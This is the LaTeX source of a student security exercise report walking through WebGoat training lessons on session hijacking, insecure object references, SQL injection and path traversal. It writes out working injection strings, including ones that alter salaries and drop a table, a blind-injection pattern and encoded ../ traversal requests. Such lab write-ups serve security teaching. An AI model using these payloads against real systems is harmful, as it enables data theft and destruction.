\documentclass[11pt,a4paper]{report}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{alltt}
\usepackage{graphicx}
\usepackage{hyperref}

% Changed the section command to say "Task #"
\def\thesection{Task \arabic{section}:}
% Added a familiar HTML command for new paragraph
\newcommand{\p}{\medskip\noindent}

% Meta, should be edited and filled in with relative information
\title{IDATT2504 Exercise 1}
\author{Torgeir Haukaas}
\date{\today}

\begin{document}
\maketitle

% Use \section for tasks
\section{WebGoat}
\subsection{A1: Broken Access Control}
\subsubsection{Hijack a session}

First I try to log in. The server sends a set-cookie with the "hijack\_cookie".
After repeating the request, it is clear that it consists of two numbers, one 
that increments by one or two, and the other is a timestamp. I can try to 
hijack a logged in users session if I can guess their cookie. When the first 
cookie increments by two it is likely that another user has logged in in 
between my attempts. Then I know the first number of their cookie, and I can 
iterate on the timestamp, which lies between my previous attempts.

\subsubsection{Insecure Direct Object References}

First I authenticate as Tom Cat. I then capture and inspect the response from
the server which includes the fields of "role" and "userId" in addition to the
others. In typical restfull fashion I can append a profile number to the end of
the profile url: /WebGoat/IDOR/profile/userId. Assuming that other user ids are
similar to Tom Cats, I try to iterate on the last two digits of Tom Cats id and
discover the userId for Buffalo Bill, 2342388. To change the info of Buffalo Bill
I change the request to PUT, content-type to application/json and append the 
json data I want to insert.

\subsection{A3: Injection}
\subsubsection{SQL Injection(Intro)}
I get the department with the query "select department from employees where userid=96134;".


I update the department with the query "update employees set department='Sales' where userId=89762;".


I add the phone column with the query "alter table employees add phone varchar(20)";.


I grant rights with the query "GRANT insert ON grant\_rights TO unauthorized\_user;".


I can use injection by inserting "Smith' or '1' = '1'".


I can use injection on the last field by writing "1 or '1' = '1'".


I can get the salaries by typing in "' or 1=1;--" in the Lastname field.


I can change John salary by inputting "smith'; update employees set 
salary = 999999 where auth\_tan='3SL99A';--".


I can delete the table by using "'; drop table access\_log; --".

\subsubsection{SQL Injection(Advanced)}

I can get the user data with the query "'; select * from user\_system\_data;--"

thisisasecretfortomonly
tom'+and+substring(password,ยง3ยง,1)='ยงtยง';--


put ../ before the username.

put ....// before username

put ../ before the filename

put urlencoded ../../ as id followed by file name GET 
/WebGoat/PathTraversal/random-picture?id=

%2e%2e%2f%2e%2e%2f%2fpath-traversal-secret HTTP/1.1
\end{document}
